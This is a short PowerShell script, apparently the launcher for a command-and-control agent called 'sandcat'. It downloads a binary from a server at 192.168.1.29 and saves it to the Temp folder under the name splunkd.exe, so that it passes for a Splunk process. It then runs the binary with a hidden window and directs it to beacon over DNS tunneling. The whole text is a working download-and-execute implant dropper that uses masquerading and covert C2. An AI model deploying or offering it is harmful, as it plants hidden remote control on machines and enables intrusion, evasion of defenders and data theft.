$server="http://192.168.1.29:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$wc.Headers.add("gocat-extensions", "dns_tunneling");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\Windows\Temp\splunkd.exe"} | stop-process -f;
rm -force "C:\Windows\Temp\splunkd.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Windows\Temp\splunkd.exe",$data) | Out-Null;
Start-Process -file C:\Windows\Temp\splunkd.exe -ArgumentList "-server 192.168.1.29:8853 -c2 DnsTunneling -group dns" -WindowStyle hidden;
